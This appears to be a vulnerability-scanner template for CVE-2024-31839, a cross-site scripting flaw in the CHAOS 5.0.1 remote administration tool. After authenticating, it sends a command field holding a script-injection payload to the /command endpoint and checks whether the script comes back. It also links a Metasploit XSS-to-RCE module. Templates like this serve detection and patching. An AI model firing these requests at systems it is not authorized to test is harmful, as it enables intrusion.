flow: http(1) && http(2) && http(3)
http:
- raw:
  - 'POST /auth HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------7531776718188184812862255877


    -----------------------------7531776718188184812862255877

    Content-Disposition: form-data; name="username"


    {{username}}

    -----------------------------7531776718188184812862255877

    Content-Disposition: form-data; name="password"


    {{password}}

    -----------------------------7531776718188184812862255877--

    '
- extractors:
  - group: 1
    internal: true
    name: address
    regex:
    - href="/shell\?address=([^"]+)"
    type: regex
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/plain")
    - contains(body, "<script>alert(document.domain)</script>")
    type: dsl
  raw:
  - 'POST /command HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------424661958414611637671358243344


    -----------------------------424661958414611637671358243344

    Content-Disposition: form-data; name="address"


    {{url_decode(address)}}

    -----------------------------424661958414611637671358243344

    Content-Disposition: form-data; name="command"


    echo ''<script>alert(document.domain)</script>''

    -----------------------------424661958414611637671358243344--

    '
id: CVE-2024-31839
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:tiagorlampert:chaos:5.0.1:*:*:*:*:*:*:*
    cve-id: CVE-2024-31839
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 4.8
    cwe-id: CWE-79
    epss-percentile: 0.99072
    epss-score: 0.80189
  description: 'Cross Site Scripting vulnerability in tiagorlampert CHAOS v.5.0.1
    allows a remote attacker to escalate privileges via the sendCommandHandler function
    in the handler.go component.

    '
  impact: 'Attackers can inject malicious scripts that execute in users'' browsers,
    potentially escalating privileges and compromising user sessions.

    '
  metadata:
    max-request: 3
    product: chaos
    vendor: tiagorlampert
    verified: true
  name: CHAOS 5.0.1 'sendCommandHandler' - Cross-Site Scripting
  reference:
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/chaos_rat_xss_to_rce.rb
  - https://github.com/tiagorlampert/CHAOS
  remediation: 'Update CHAOS to a version that patches the XSS vulnerability in the
    sendCommandHandler function.

    '
  severity: medium
  tags: cve,cve2024,chaos,tiagorlampert,xss,intrusive,vkev,vuln
